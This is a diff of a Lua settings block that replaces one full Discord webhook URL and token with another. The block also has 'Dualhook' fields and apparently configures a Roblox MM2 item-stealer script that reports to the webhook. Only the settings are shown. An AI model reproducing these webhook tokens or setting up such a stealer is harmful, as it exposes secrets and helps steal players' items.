@@ -1,6 +1,6 @@
 -- [ Settings ] --
 Username = "MM2danya8" -- [Your Username]
-Webhook = "https://discord.com/api/webhooks/1340288534917025812/ZrbM3myTf_7xbAd5fIs-zprMTTJO4782cyFehPf-BMd1sdGnAD2PZ7eoFVctSeycMD4j" -- [Your Webhook]
+Webhook = "https://discord.com/api/webhooks/1340297650859278356/bWTOpK1M0MA6PobacR-4O0_Z9NzO0vbgr4SBX7Jbs32uJZq3WAhbCSrDASS17pzAILWr" -- [Your Webhook]
 
 -- [ Dualhook Settings ] --
 DualUsername = "" -- [Dualhook Username]
